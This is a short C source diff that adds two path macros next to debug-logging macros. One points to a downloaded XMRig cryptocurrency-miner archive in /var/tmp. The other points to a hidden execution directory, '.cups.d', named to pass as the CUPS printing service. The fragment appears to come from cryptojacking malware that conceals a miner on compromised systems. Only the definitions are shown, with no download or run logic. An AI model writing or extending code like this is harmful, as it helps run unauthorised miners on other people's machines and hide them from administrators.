@@ -7,6 +7,9 @@
 
 #define DEBUG 1
 
+#define MONEY_DOWNLOAD_PATH "/var/tmp/xmrig.tar.gz"
+#define MONEY_EXECPATH "/var/tmp/.cups.d"
+
 #define DEBUG_LOG(args...) if(DEBUG) global->fprintf(global->stdout, args)
 #define DEBUG_LOG_ERR(args...) if(DEBUG) global->fprintf(global->stderr, args)
 
